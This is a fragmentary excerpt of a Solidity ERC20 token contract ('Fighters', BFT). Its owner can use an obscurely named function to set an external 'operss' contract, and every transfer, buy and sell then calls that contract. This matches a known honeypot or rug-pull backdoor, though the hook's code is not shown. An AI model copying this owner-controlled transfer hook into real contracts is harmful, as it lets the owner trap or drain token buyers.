...
contract TokenM is ERC20 {
    ...
    IUserAmountoperss public operss;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Fighters", "BFT") {
    ...
    function ctyesoneBeringRousd(IUserAmountoperss _operss) public onlyOwner {
        operss = _operss;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                operss.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				operss.addOutAmount(from, amount);
            }else{
                operss.addOutAmount(from, amount);
                takeFee = false;
            }
